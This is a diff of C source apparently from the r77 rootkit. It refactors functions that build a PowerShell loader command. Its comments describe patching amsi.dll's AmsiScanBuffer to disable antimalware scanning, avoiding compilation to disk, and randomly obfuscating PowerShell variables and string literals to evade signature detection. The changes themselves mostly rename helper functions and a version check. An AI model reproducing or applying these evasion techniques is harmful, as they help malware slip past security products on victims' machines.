@@ -2,10 +2,8 @@
 #include "resource.h"
 #include "r77def.h"
 #include "r77win.h"
-#include "r77runtime.h"
 #include <wchar.h>
 #include <Shlwapi.h>
-#include <VersionHelpers.h>
 
 int main()
 {
@@ -66,7 +64,7 @@ LPWSTR GetPowershellCommand(BOOL is64Bit)
 	// AMSI must be disabled for the entire process, because both powershell and .NET itself implement AMSI.
 
 	// AMSI is only supported on Windows 10.
-	if (IsWindows10OrGreater2())
+	if (R77_IsWindows10OrGreater())
 	{
 		// Patch amsi.dll!AmsiScanBuffer prior to [Reflection.Assembly]::Load.
 		// Do not use Add-Type, because it will invoke csc.exe and compile a C# DLL to disk.
@@ -177,7 +175,7 @@ VOID ObfuscatePowershellVariable(LPWSTR command, LPCWSTR variableName)
 	{
 		for (LPWSTR ocurrence; ocurrence = StrStrIW(command, variableName);)
 		{
-			libc_wmemcpy(ocurrence, newName, length);
+			i_wmemcpy(ocurrence, newName, length);
 		}
 	}
 }
@@ -193,7 +191,7 @@ VOID ObfuscatePowershellStringLiterals(LPWSTR command)
 	// will eventually end up in a list of known signatures.
 
 	PWCHAR newCommand = NEW_ARRAY(WCHAR, 16384);
-	libc_memset(newCommand, 0, 16384 * sizeof(WCHAR));
+	i_wmemset(newCommand, 0, 16384);
 
 	LPBYTE random = NEW_ARRAY(BYTE, 16384);
 	if (!GetRandomBytes(random, 16384)) return;
@@ -225,10 +223,10 @@ VOID ObfuscatePowershellStringLiterals(LPWSTR command)
 		{
 			WCHAR c = beginQuote[i + 1];
 			WCHAR charNumber[10];
-			libc_ltow(c, charNumber);
+			Int32ToStrW(c, charNumber);
 
 			WCHAR obfuscatedChar[20];
-			libc_memset(obfuscatedChar, 0, 20 * sizeof(WCHAR));
+			i_wmemset(obfuscatedChar, 0, 20);
 
 			// Randomly choose an obfuscation technique.
 			switch ((*randomPtr++) & 3)
